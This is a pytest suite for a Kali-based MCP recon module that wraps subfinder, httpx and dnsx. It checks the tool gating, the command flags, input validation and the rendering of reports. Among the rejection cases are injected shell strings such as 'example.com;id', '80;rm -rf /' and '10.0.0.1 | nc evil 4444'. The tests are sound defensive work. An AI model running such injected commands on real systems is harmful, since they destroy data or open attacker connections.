"""Tests for the web recon pipeline (subfinder / httpx / dnsx).

Covers per the project baseline:
  - gating/registration (🟡 via RECON_TOOLS, never in the green registry)
  - command construction (exact flags, verified against upstream Go sources)
  - input validation (shell-meta, shape, bounds)
  - JSONL output parsing and report rendering
"""

from __future__ import annotations

import asyncio
import json

import pytest

from kali_mcp.executor import CommandResult
from kali_mcp.recon import (
    RECON_TOOLS,
    DnsxInput,
    HttpxInput,
    SubfinderInput,
    _httpx_entry_host,
    _httpx_report,
    _dnsx_report,
    _parse_subfinder,
    _subfinder_cmd,
    _subfinder_report,
    dnsx_lookup,
    httpx_probe,
    subfinder_scan,
)
from kali_mcp.tools import TOOL_REGISTRY


def _run(coro):
    return asyncio.run(coro)


# ===================================================================
# Gating / registration
# ===================================================================


class TestReconGating:
    """🟡 gating: the trio lives in RECON_TOOLS only, never unconditionally."""

    def test_trio_registered(self):
        assert set(RECON_TOOLS) == {"subfinder_scan", "httpx_probe", "dnsx_lookup"}
        for name, (func, model) in RECON_TOOLS.items():
            assert callable(func)
            assert model.__name__

    def test_not_in_green_registry(self):
        for name in RECON_TOOLS:
            assert name not in TOOL_REGISTRY

    def test_server_registers_recon_under_pentest_guard(self):
        """server.py must register RECON_TOOLS inside the PENTEST_ENABLED
        block (same guard as vulnscan), not at module top level."""
        import inspect

        import kali_mcp.server as s

        src = inspect.getsource(s)
        # The recon import must appear AFTER the PENTEST_ENABLED guard line
        # and not in the unconditional registration section.
        guard = src.index('_pentest_enabled = os.getenv("PENTEST_ENABLED"')
        recon = src.index("from kali_mcp.recon import RECON_TOOLS")
        assert guard < recon


# ===================================================================
# subfinder
# ===================================================================


class TestSubfinderInput:
    def test_defaults(self):
        m = SubfinderInput(domain="example.com")
        assert m.all_sources is False
        assert m.sources == ""
        assert m.exclude_sources == ""
        assert m.timeout == 180
        assert m.max_results == 300

    @pytest.mark.parametrize("domain", ["example.com", "sub.example.co.uk"])
    def test_valid_domains(self, domain):
        assert SubfinderInput(domain=domain).domain == domain

    def test_shell_meta_rejected(self):
        with pytest.raises(Exception):
            SubfinderInput(domain="example.com;id")

    def test_bad_domain_rejected(self):
        with pytest.raises(Exception):
            SubfinderInput(domain="example..com")

    def test_sources_normalized(self):
        m = SubfinderInput(domain="example.com", sources="crtsh, wayback")
        assert m.sources == "crtsh,wayback"

    def test_sources_uppercase_rejected(self):
        with pytest.raises(Exception):
            SubfinderInput(domain="example.com", sources="Crtsh")

    def test_sources_shell_meta_rejected(self):
        with pytest.raises(Exception):
            SubfinderInput(domain="example.com", sources="crtsh;rm -rf")

    @pytest.mark.parametrize("t", [5, 601])
    def test_timeout_bounds(self, t):
        with pytest.raises(Exception):
            SubfinderInput(domain="example.com", timeout=t)


class TestSubfinderCmd:
    def _capture(self, monkeypatch, params, stdout="", success=True):
        import kali_mcp.recon as r

        captured = {}

        class _CapEx:
            async def run(self, cmd, timeout=None, input_data=None):
                captured["cmd"] = cmd
                captured["timeout"] = timeout
                return CommandResult(
                    stdout=stdout, stderr="",
                    returncode=0 if success else 1, success=success,
                )

        monkeypatch.setattr(r, "get_executor", lambda timeout=None: _CapEx())
        out = _run(subfinder_scan(params))
        assert isinstance(out, str)
        return captured, out

    def test_default_cmd(self, monkeypatch):
        captured, _ = self._capture(monkeypatch, SubfinderInput(domain="example.com"))
        cmd = captured["cmd"]
        assert cmd[0] == "subfinder"
        assert "-d" in cmd and cmd[cmd.index("-d") + 1] == "example.com"
        assert "--json" in cmd
        assert "--silent" in cmd
        assert "--no-color" in cmd
        assert "--disable-update-check" in cmd
        # Passive guarantee: no active-resolution flag
        assert "--active" not in cmd
        # -oJ is the alias; the canonical long flag must be used
        assert "-oJ" not in cmd
        # No optional flags by default
        assert "--all" not in cmd
        assert "-s" not in cmd
        assert "-es" not in cmd

    def test_all_sources_flag(self, monkeypatch):
        captured, _ = self._capture(
            monkeypatch, SubfinderInput(domain="example.com", all_sources=True)
        )
        assert "--all" in captured["cmd"]

    def test_source_selection_flags(self, monkeypatch):
        captured, _ = self._capture(
            monkeypatch,
            SubfinderInput(
                domain="example.com",
                sources="crtsh,wayback",
                exclude_sources="alienvault",
            ),
        )
        cmd = captured["cmd"]
        assert cmd[cmd.index("-s") + 1] == "crtsh,wayback"
        assert cmd[cmd.index("-es") + 1] == "alienvault"

    def test_wall_timeout_forwarded(self, monkeypatch):
        captured, _ = self._capture(
            monkeypatch, SubfinderInput(domain="example.com", timeout=300)
        )
        assert captured["timeout"] == 300


_SUBFINDER_SAMPLE = "\n".join(
    [
        json.dumps({"host": "www.example.com", "input": "example.com", "source": "crtsh"}),
        json.dumps({"host": "api.example.com", "input": "example.com", "source": "wayback"}),
        json.dumps({"host": "api.example.com", "input": "example.com", "source": "crtsh"}),
        json.dumps({"host": "shop.api.example.com", "input": "example.com", "source": "urlscan"}),
        "not json at all",
    ]
)


class TestSubfinderOutput:
    def test_parse_dedupes_and_sorts(self):
        subs = _parse_subfinder(_SUBFINDER_SAMPLE)
        assert subs == [
            "api.example.com",
            "shop.api.example.com",
            "www.example.com",
        ]

    def test_parse_legacy_domain_key(self):
        # Older subfinder builds used "domain" instead of "host"
        line = json.dumps({"domain": "a.example.com", "input": "example.com"})
        assert _parse_subfinder(line) == ["a.example.com"]

    def test_report_with_findings(self):
        p = SubfinderInput(domain="example.com")
        report = _subfinder_report(p, _parse_subfinder(_SUBFINDER_SAMPLE))
        assert "发现:** 3 个子域" in report
        assert "api.example.com" in report
        assert "父域分布" in report
        # Parent grouping: api.example.com owns shop.api.example.com
        assert "`api.example.com`: 1" in report

    def test_report_empty(self):
        p = SubfinderInput(domain="example.com")
        report = _subfinder_report(p, [])
        assert "未发现子域" in report

    def test_report_truncated_by_max_results(self):
        subs = [f"s{i:03d}.example.com" for i in range(50)]
        p = SubfinderInput(domain="example.com", max_results=10)
        report = _subfinder_report(p, subs)
        assert "前 10 个" in report
        assert "其余 40 个未列出" in report

    def test_end_to_end_success(self, monkeypatch):
        captured, out = TestSubfinderCmd()._capture(
            monkeypatch, SubfinderInput(domain="example.com"),
            stdout=_SUBFINDER_SAMPLE,
        )
        assert "## 🔭 Subfinder" in out
        assert "www.example.com" in out

    def test_end_to_end_failure_hints_install(self, monkeypatch):
        captured, out = TestSubfinderCmd()._capture(
            monkeypatch, SubfinderInput(domain="example.com"),
            stdout="", success=False,
        )
        assert "subfinder 执行失败" in out
        assert "apt install subfinder" in out


# ===================================================================
# httpx
# ===================================================================


class TestHttpxTargets:
    def test_defaults(self):
        m = HttpxInput(targets="example.com")
        assert m.ports == "80,443"
        assert m.threads == 50
        assert m.timeout == 10
        assert m.wall_timeout == 300
        assert m.follow_redirects is False
        assert m.tech_detect is True
        assert m.rate_limit == 150

    def test_mixed_entry_forms(self):
        m = HttpxInput(
            targets="example.com, 10.0.0.1:8080, http://192.168.0.5/admin"
        )
        assert m.targets.count("10.0.0.1:8080") == 1

    def test_ipv6_bracket_url(self):
        m = HttpxInput(targets="http://[::1]:8080/")
        assert m.targets

    def test_shell_meta_rejected(self):
        with pytest.raises(Exception):
            HttpxInput(targets="example.com;id")
        with pytest.raises(Exception):
            HttpxInput(targets="10.0.0.1 | nc evil 4444")

    def test_empty_rejected(self):
        with pytest.raises(Exception):
            HttpxInput(targets="   ")

    def test_over_entry_cap_rejected(self):
        many = ",".join(f"host{i}.example.com" for i in range(201))
        with pytest.raises(Exception):
            HttpxInput(targets=many)

    def test_entry_cap_boundary_ok(self):
        many = ",".join(f"host{i}.example.com" for i in range(200))
        assert len(HttpxInput(targets=many).targets) > 0


class TestHttpxPorts:
    @pytest.mark.parametrize(
        "ports",
        ["80,443", "8000-8100", "http:8080,https:8443", "443"],
    )
    def test_valid(self, ports):
        m = HttpxInput(targets="example.com", ports=ports)
        assert m.ports == ports

    @pytest.mark.parametrize(
        "ports",
        ["80;rm -rf /", "U:53", "top-100", "80 443", "100-1", "80,99999", ""],
    )
    def test_invalid(self, ports):
        with pytest.raises(Exception):
            HttpxInput(targets="example.com", ports=ports)


def test_httpx_entry_host_extraction():
    assert _httpx_entry_host("example.com") == "example.com"
    assert _httpx_entry_host("10.0.0.1:8080") == "10.0.0.1"
    assert _httpx_entry_host("http://example.com/path?q=1") == "example.com"
    assert _httpx_entry_host("https://[::1]:8443/") == "::1"
    assert _httpx_entry_host("http://example.com:8080") == "example.com"


class TestHttpxCmd:
    def _capture(self, monkeypatch, params, stdout="", success=True):
        import kali_mcp.recon as r

        captured = {}

        class _CapEx:
            async def run(self, cmd, timeout=None, input_data=None):
                captured["cmd"] = cmd
                captured["timeout"] = timeout
                captured["input_data"] = input_data
                return CommandResult(
                    stdout=stdout, stderr="",
                    returncode=0 if success else 1, success=success,
                )

        monkeypatch.setattr(r, "get_executor", lambda timeout=None: _CapEx())
        out = _run(httpx_probe(params))
        assert isinstance(out, str)
        return captured, out

    def test_default_cmd(self, monkeypatch):
        captured, _ = self._capture(
            monkeypatch, HttpxInput(targets="example.com, 10.0.0.1")
        )
        cmd = captured["cmd"]
        assert cmd[0] == "httpx"
        assert "--json" in cmd
        assert "--silent" in cmd
        assert "--no-color" in cmd
        assert cmd[cmd.index("-p") + 1] == "80,443"
        assert cmd[cmd.index("-t") + 1] == "50"
        assert cmd[cmd.index("--timeout") + 1] == "10"
        assert cmd[cmd.index("-rl") + 1] == "150"
        # Extraction must be enabled or title/tech vanish from JSON
        for flag in ("--status-code", "--title", "--content-length",
                     "--content-type", "--web-server", "--tech-detect"):
            assert flag in cmd
        # Targets travel via stdin, not on the command line
        assert "-u" not in cmd
        assert "-l" not in cmd
        assert captured["input_data"] == "example.com\n10.0.0.1"

    def test_optional_flags(self, monkeypatch):
        captured, _ = self._capture(
            monkeypatch,
            HttpxInput(
                targets="example.com",
                follow_redirects=True,
                http2=True,
                tech_detect=False,
                threads=10,
                rate_limit=5,
            ),
        )
        cmd = captured["cmd"]
        assert "-fr" in cmd
        assert "--http2" in cmd
        assert "--tech-detect" not in cmd
        assert cmd[cmd.index("-t") + 1] == "10"
        assert cmd[cmd.index("-rl") + 1] == "5"

    def test_wall_timeout_forwarded(self, monkeypatch):
        captured, _ = self._capture(
            monkeypatch, HttpxInput(targets="example.com", wall_timeout=600)
        )
        assert captured["timeout"] == 600

    def test_scheme_prefixed_ports(self, monkeypatch):
        captured, _ = self._capture(
            monkeypatch, HttpxInput(targets="example.com", ports="http:8080,https:8443")
        )
        assert captured["cmd"][captured["cmd"].index("-p") + 1] == "http:8080,https:8443"


_HTTPX_SAMPLE = "\n".join(
    [
        json.dumps(
            {
                "input": "example.com",
                "url": "http://example.com/",
                "title": "Example Domain",
                "status_code": 200,
                "content_length": 1559,
                "content_type": "text/html",
                "webserver": "ECS (dcb/7F84)",
                "tech": ["HTML", "HTTP"],
            }
        ),
        json.dumps(
            {
                "input": "10.0.0.1",
                "url": "http://10.0.0.1:8080/",
                "title": "Admin",
                "status_code": 200,
                "content_length": 0,
                "web_server": "nginx/1.24",  # legacy key
                "tech": ["nginx"],
            }
        ),
        json.dumps({"input": "dead.example.com", "failed": True}),
        "garbage line",
    ]
)


class TestHttpxOutput:
    def test_report_live_table(self):
        import kali_mcp.recon as r

        rows = r._parse_jsonl(_HTTPX_SAMPLE)
        p = HttpxInput(targets="example.com, 10.0.0.1, dead.example.com")
        report = _httpx_report(p, rows, 3)
        assert "存活服务:** 2 条" in report
        assert "无响应目标:** 1 个" in report
        assert "`http://example.com/`" in report
        assert "Example Domain" in report
        # tech list rendered
        assert "nginx" in report
        # legacy web_server key falls back
        assert "nginx/1.24" in report
        assert "`200`: 2" in report

    def test_report_empty(self):
        p = HttpxInput(targets="example.com")
        report = _httpx_report(p, [], 1)
        assert "未发现存活的 web 服务" in report

    def test_report_truncated(self):
        import kali_mcp.recon as r

        rows = [
            {
                "input": f"h{i}.example.com",
                "url": f"http://h{i}.example.com/",
                "status_code": 200,
                "content_length": 10,
                "title": f"T{i}",
            }
            for i in range(30)
        ]
        p = HttpxInput(targets="x", max_results=5)
        report = _httpx_report(p, rows, 30)
        assert "其余 25 条未列出" in report

    def test_end_to_end_success(self, monkeypatch):
        _, out = TestHttpxCmd()._capture(
            monkeypatch,
            HttpxInput(targets="example.com"),
            stdout=_HTTPX_SAMPLE,
        )
        assert "## 🌐 httpx" in out

    def test_end_to_end_failure_hints_install(self, monkeypatch):
        _, out = TestHttpxCmd()._capture(
            monkeypatch, HttpxInput(targets="example.com"),
            stdout="", success=False,
        )
        assert "httpx 执行失败" in out
        assert "apt install httpx" in out


# ===================================================================
# dnsx
# ===================================================================


class TestDnsxInput:
    def test_defaults(self):
        m = DnsxInput(domains="example.com")
        assert m.record_types == "a,aaaa,cname,ns,txt,mx"
        assert m.all_records is False
        assert m.auto_wildcard is True
        assert m.timeout == 10
        assert m.threads == 100

    def test_multi_domain_list(self):
        m = DnsxInput(domains="example.com, sub.example.com")
        assert "sub.example.com" in m.domains

    def test_shell_meta_rejected(self):
        with pytest.raises(Exception):
            DnsxInput(domains="example.com;id")

    def test_bad_domain_rejected(self):
        with pytest.raises(Exception):
            DnsxInput(domains="example..com")

    def test_record_types_normalized(self):
        m = DnsxInput(domains="example.com", record_types="A, TXT")
        assert m.record_types == "a,txt"

    def test_unknown_record_type_rejected(self):
        with pytest.raises(Exception):
            DnsxInput(domains="example.com", record_types="a,bogus")

    def test_empty_record_types_rejected(self):
        with pytest.raises(Exception):
            DnsxInput(domains="example.com", record_types="   ")

    def test_over_entry_cap_rejected(self):
        # Short names so the 2048-char field limit does not fire first
        many = ",".join(f"d{i}.com" for i in range(201))
        assert len(many) < 2048
        with pytest.raises(Exception):
            DnsxInput(domains=many)


class TestDnsxCmd:
    def _capture(self, monkeypatch, params, stdout="", success=True):
        import kali_mcp.recon as r

        captured = {}

        class _CapEx:
            async def run(self, cmd, timeout=None, input_data=None):
                captured["cmd"] = cmd
                captured["timeout"] = timeout
                return CommandResult(
                    stdout=stdout, stderr="",
                    returncode=0 if success else 1, success=success,
                )

        monkeypatch.setattr(r, "get_executor", lambda timeout=None: _CapEx())
        out = _run(dnsx_lookup(params))
        assert isinstance(out, str)
        return captured, out

    def test_default_cmd(self, monkeypatch):
        captured, _ = self._capture(
            monkeypatch, DnsxInput(domains="example.com, sub.example.com")
        )
        cmd = captured["cmd"]
        assert cmd[0] == "dnsx"
        # -l (list) = plain resolution; -d is brute-force mode and REQUIRES
        # a wordlist in released dnsx 1.3.x builds
        assert cmd[cmd.index("-l") + 1] == "example.com,sub.example.com"
        assert "-d" not in cmd
        assert "--json" in cmd
        assert "--or" in cmd  # omit raw response from JSONL
        assert "--silent" in cmd
        assert "--no-color" in cmd
        assert "--disable-update-check" in cmd
        # Default record types map to individual flags
        for flag in ("--a", "--aaaa", "--cname", "--ns", "--txt", "--mx"):
            assert flag in cmd
        for flag in ("--srv", "--ptr", "--soa", "--caa", "--any", "-all"):
            assert flag not in cmd
        assert "--auto-wildcard" in cmd
        # dnsx --timeout takes a Go duration
        assert cmd[cmd.index("--timeout") + 1] == "10s"
        assert cmd[cmd.index("-t") + 1] == "100"
        # No flag that does not exist in current dnsx
        assert "--chaos" not in cmd
        assert "-j" not in cmd

    def test_explicit_record_types(self, monkeypatch):
        captured, _ = self._capture(
            monkeypatch, DnsxInput(domains="example.com", record_types="a,txt")
        )
        cmd = captured["cmd"]
        assert "--a" in cmd and "--txt" in cmd
        for flag in ("--aaaa", "--cname", "--ns", "--mx", "--soa"):
            assert flag not in cmd

    def test_all_records_flag(self, monkeypatch):
        captured, _ = self._capture(
            monkeypatch,
            DnsxInput(domains="example.com", all_records=True),
        )
        cmd = captured["cmd"]
        assert "-all" in cmd
        # Per-type flags must not be combined with -all
        assert "--a" not in cmd

    def test_auto_wildcard_off(self, monkeypatch):
        captured, _ = self._capture(
            monkeypatch,
            DnsxInput(domains="example.com", auto_wildcard=False),
        )
        assert "--auto-wildcard" not in captured["cmd"]

    def test_wall_timeout_forwarded(self, monkeypatch):
        captured, _ = self._capture(
            monkeypatch, DnsxInput(domains="example.com", wall_timeout=300)
        )
        assert captured["timeout"] == 300


_DNSX_SAMPLE = "\n".join(
    [
        json.dumps(
            {
                "host": "www.example.com",
                "a": ["93.184.216.34"],
                "aaaa": ["2606:2800:220:1:248:1893:25c8:1946"],
                "ns": ["ns1.example.com", "ns2.example.com"],
                "txt": ["v=spf1 mx -all"],
            }
        ),
        json.dumps(
            {
                "host": "example.com",
                "a": ["10.0.0.5"],
                "mx": ["mail.example.com"],
                "soa": [
                    {
                        "name": "example.com",
                        "ns": "ns1.example.com",
                        "mailbox": "admin.example.com",
                        "serial": 2024010101,
                    }
                ],
                "internal_ips": ["10.0.0.5"],
                "status_code": "NOERROR",
            }
        ),
        json.dumps({"host": "empty.example.com"}),
    ]
)


class TestDnsxOutput:
    def test_report_table(self):
        import kali_mcp.recon as r

        rows = r._parse_jsonl(_DNSX_SAMPLE)
        p = DnsxInput(domains="example.com")
        report = _dnsx_report(p, rows)
        assert "有记录主机:** 3 个" in report
        assert "`www.example.com`" in report
        assert "93.184.216.34" in report
        assert "2606:2800:220:1:248:1893:25c8:1946" in report
        assert "mail.example.com" in report
        assert "v=spf1 mx -all" in report
        # SOA annotation on the host cell
        assert "SOA: example.com" in report
        # Internal-IP callout
        assert "内网 IP 提示" in report
        assert "`example.com` → 10.0.0.5" in report

    def test_report_empty(self):
        p = DnsxInput(domains="example.com")
        report = _dnsx_report(p, [])
        assert "未发现 DNS 记录" in report

    def test_report_truncated(self):
        import kali_mcp.recon as r

        rows = [
            {"host": f"h{i}.example.com", "a": ["1.1.1.1"]}
            for i in range(30)
        ]
        p = DnsxInput(domains="example.com", max_results=5)
        report = _dnsx_report(p, rows)
        assert "其余 25 个主机未列出" in report

    def test_end_to_end_success(self, monkeypatch):
        _, out = TestDnsxCmd()._capture(
            monkeypatch, DnsxInput(domains="example.com"),
            stdout=_DNSX_SAMPLE,
        )
        assert "## 🧬 dnsx" in out
        assert "93.184.216.34" in out

    def test_end_to_end_failure_hints_install(self, monkeypatch):
        _, out = TestDnsxCmd()._capture(
            monkeypatch, DnsxInput(domains="example.com"),
            stdout="", success=False,
        )
        assert "dnsx 执行失败" in out
        assert "apt install dnsx" in out
